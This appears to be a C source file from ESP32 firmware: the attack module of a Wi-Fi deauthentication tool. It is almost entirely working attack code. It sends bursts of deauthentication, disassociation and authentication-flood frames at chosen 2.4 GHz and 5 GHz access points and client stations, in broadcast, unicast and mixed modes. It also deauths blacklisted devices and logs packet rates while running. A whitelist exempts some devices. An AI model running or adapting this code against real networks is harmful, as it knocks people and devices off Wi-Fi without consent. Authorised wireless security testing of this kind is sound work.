#include "attack.h"

#include <string.h>
#include <inttypes.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_timer.h"
#include "esp_log.h"

#include "io.h"
#include "frames.h"
#include "targets.h"
#include "acl.h"

static volatile bool s_running = false;
static TaskHandle_t  s_task = NULL;

static uint32_t s_duration = 0;
static uint32_t s_started_us = 0;
static uint32_t s_pkts_24 = 0;
static uint32_t s_pkts_5  = 0;
static uint32_t s_pkts_bl = 0;

static uint32_t now_sec(void)
{
    return (uint32_t)(esp_timer_get_time() / 1000000ULL);
}

static const char *bssid_str(const uint8_t *b, char *out)
{
    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
    return out;
}

/* Hit one AP target with the chosen mode. Returns frames sent. */
static uint32_t attack_burst_for_ap(const target_ap_t *ap, attack_mode_t mode)
{
    if (acl_wl_contains(ap->bssid)) {
        /* whitelisted AP — never attack */
        return 0;
    }

    uint32_t sent = 0;

    /* If broadcast/disassoc and we have any whitelisted STAs that we know
     * are associated with this AP, we MUST downgrade to per-STA unicast so
     * the whitelist is honored. */
    bool downgrade_to_unicast = false;
    int sta_n = targets_sta_count();
    for (int i = 0; i < sta_n; i++) {
        target_sta_t s;
        if (targets_get_sta(i, &s) != 0) continue;
        if (memcmp(s.bssid, ap->bssid, 6) != 0) continue;
        if (acl_wl_contains(s.mac)) {
            downgrade_to_unicast = true;
            break;
        }
    }

    switch (mode) {
        case ATTACK_MODE_BROADCAST:
        case ATTACK_MODE_DISASSOC: {
            uint8_t subtype_disassoc = (mode == ATTACK_MODE_DISASSOC);
            if (downgrade_to_unicast) {
                for (int i = 0; i < sta_n; i++) {
                    target_sta_t s;
                    if (targets_get_sta(i, &s) != 0) continue;
                    if (memcmp(s.bssid, ap->bssid, 6) != 0) continue;
                    if (acl_wl_contains(s.mac)) continue;
                    if (subtype_disassoc) {
                        sent += frames_burst_disassoc(ap->channel, s.mac, ap->bssid);
                    } else {
                        sent += frames_burst_deauth(ap->channel, s.mac, ap->bssid);
                    }
                }
            } else {
                if (subtype_disassoc) {
                    sent += frames_burst_disassoc(ap->channel, MAC_BROADCAST, ap->bssid);
                } else {
                    sent += frames_burst_deauth(ap->channel, MAC_BROADCAST, ap->bssid);
                }
            }
            break;
        }
        case ATTACK_MODE_UNICAST: {
            target_sta_t s;
            if (targets_get_selected_sta(&s)) {
                if (!acl_wl_contains(s.mac) && !acl_wl_contains(s.bssid)) {
                    sent += frames_burst_deauth(s.channel, s.mac, s.bssid);
                }
            }
            break;
        }
        case ATTACK_MODE_AUTHFLOOD:
            sent += frames_burst_auth_flood(ap->channel, ap->bssid);
            break;
        case ATTACK_MODE_MIXED:
            if (downgrade_to_unicast) {
                for (int i = 0; i < sta_n; i++) {
                    target_sta_t s;
                    if (targets_get_sta(i, &s) != 0) continue;
                    if (memcmp(s.bssid, ap->bssid, 6) != 0) continue;
                    if (acl_wl_contains(s.mac)) continue;
                    sent += frames_burst_deauth(ap->channel, s.mac, ap->bssid);
                    sent += frames_burst_disassoc(ap->channel, s.mac, ap->bssid);
                }
            } else {
                sent += frames_burst_deauth(ap->channel, MAC_BROADCAST, ap->bssid);
                sent += frames_burst_disassoc(ap->channel, MAC_BROADCAST, ap->bssid);
            }
            sent += frames_burst_auth_flood(ap->channel, ap->bssid);
            break;
    }
    return sent;
}

/* Hit any blacklisted MAC seen in the sniffer's STA list, regardless of
 * which AP is currently selected. */
static uint32_t blacklist_pass(void)
{
    uint32_t sent = 0;
    int sta_n = targets_sta_count();
    for (int i = 0; i < sta_n; i++) {
        target_sta_t s;
        if (targets_get_sta(i, &s) != 0) continue;
        if (!acl_bl_contains(s.mac)) continue;
        if (acl_wl_contains(s.mac)) continue;  /* whitelist always wins */
        sent += frames_burst_deauth(s.channel, s.mac, s.bssid);
    }
    /* Also: any AP whose BSSID is on the blacklist gets a broadcast deauth. */
    int bl_n = acl_bl_count();
    for (int i = 0; i < bl_n; i++) {
        uint8_t mac[6];
        acl_kind_t kind;
        if (acl_bl_get(i, mac, &kind) != 0) continue;
        if (kind != ACL_KIND_BSSID) continue;
        if (acl_wl_contains(mac)) continue;
        /* We don't know its channel reliably; pull from the AP scan list. */
        int aps = targets_ap_count();
        for (int j = 0; j < aps; j++) {
            target_ap_t ap;
            if (targets_get_ap(j, &ap) != 0) continue;
            if (memcmp(ap.bssid, mac, 6) != 0) continue;
            sent += frames_burst_deauth(ap.channel, MAC_BROADCAST, ap.bssid);
            break;
        }
    }
    return sent;
}

static void attack_task(void *arg)
{
    (void)arg;
    char b1[18], b2[18];
    target_ap_t  ap24, ap5;
    target_sta_t sta;
    bool has24 = targets_get_selected_24(&ap24);
    bool has5  = targets_get_selected_5(&ap5);
    bool has_sta = targets_get_selected_sta(&sta);
    attack_mode_t mode = targets_get_mode();

    s_started_us = (uint32_t)(esp_timer_get_time() / 1000000ULL);
    s_pkts_24 = s_pkts_5 = s_pkts_bl = 0;

    io_log("attack: start mode=%s duration=%us\r\n", targets_mode_name(mode), (unsigned)s_duration);
    if (has24)    io_log("  2.4 GHz: %s ch=%u %s\r\n", ap24.ssid, (unsigned)ap24.channel, bssid_str(ap24.bssid, b1));
    if (has5)     io_log("  5   GHz: %s ch=%u %s\r\n", ap5.ssid, (unsigned)ap5.channel, bssid_str(ap5.bssid, b2));
    if (has_sta)  io_log("  STA   : %s on %s ch=%u\r\n",
                         bssid_str(sta.mac, b1), bssid_str(sta.bssid, b2), (unsigned)sta.channel);

    if (!has24 && !has5 && !has_sta && mode != ATTACK_MODE_UNICAST) {
        io_log("attack: no targets selected — set t24/t5/sta first\r\n");
        s_running = false;
        s_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    uint32_t last_log = 0;
    uint32_t cycles = 0;

    while (s_running) {
        uint32_t elapsed = now_sec() - s_started_us;
        if (elapsed >= s_duration) break;

        if (has24) s_pkts_24 += attack_burst_for_ap(&ap24, mode);
        vTaskDelay(pdMS_TO_TICKS(5));
        if (has5)  s_pkts_5  += attack_burst_for_ap(&ap5, mode);
        vTaskDelay(pdMS_TO_TICKS(5));

        s_pkts_bl += blacklist_pass();
        vTaskDelay(pdMS_TO_TICKS(2));

        cycles++;

        if (elapsed - last_log >= 2) {
            last_log = elapsed;
            uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
            float pps = (float)total / (float)(elapsed > 0 ? elapsed : 1);
            io_log("attack: %us  total=%" PRIu32 "  pps=%.0f  cycles=%" PRIu32 "  (24=%" PRIu32 " 5=%" PRIu32 " bl=%" PRIu32 ")\r\n",
                   (unsigned)elapsed, total, pps, cycles, s_pkts_24, s_pkts_5, s_pkts_bl);
        }
    }

    uint32_t total_time = now_sec() - s_started_us;
    uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
    io_log("attack: stopped after %us  total=%" PRIu32 "  avg_pps=%.0f\r\n",
           (unsigned)total_time, total,
           (float)total / (float)(total_time > 0 ? total_time : 1));

    s_running = false;
    s_task = NULL;
    vTaskDelete(NULL);
}

void attack_init(void)
{
    s_running = false;
    s_task = NULL;
}

bool attack_start(uint32_t duration_seconds)
{
    if (s_running) {
        io_log("attack: already running\r\n");
        return false;
    }
    if (duration_seconds < 1) duration_seconds = 1;
    if (duration_seconds > 3600) duration_seconds = 3600;
    s_duration = duration_seconds;
    s_running = true;
    /* Priority 3: below the serial RX task (8) and below the default app
     * task (5) so a running attack never starves the CLI. */
    if (xTaskCreate(attack_task, "attack", 8192, NULL, 3, &s_task) != pdPASS) {
        s_running = false;
        io_log("attack: task create failed\r\n");
        return false;
    }
    return true;
}

void attack_stop(void)
{
    if (!s_running) {
        io_log("attack: not running\r\n");
        return;
    }
    io_log("attack: stop requested\r\n");
    s_running = false;
}

bool attack_is_running(void)
{
    return s_running;
}

void attack_print_status(void)
{
    if (!s_running) {
        io_log("status: idle  mode=%s\r\n", targets_mode_name(targets_get_mode()));
        return;
    }
    uint32_t elapsed = now_sec() - s_started_us;
    uint32_t remain = (elapsed >= s_duration) ? 0 : (s_duration - elapsed);
    uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
    float pps = (float)total / (float)(elapsed > 0 ? elapsed : 1);
    io_log("status: running  mode=%s  elapsed=%us  remain=%us  pkts=%" PRIu32 "  pps=%.0f  (24=%" PRIu32 " 5=%" PRIu32 " bl=%" PRIu32 ")\r\n",
           targets_mode_name(targets_get_mode()),
           (unsigned)elapsed, (unsigned)remain, total, pps,
           s_pkts_24, s_pkts_5, s_pkts_bl);
}
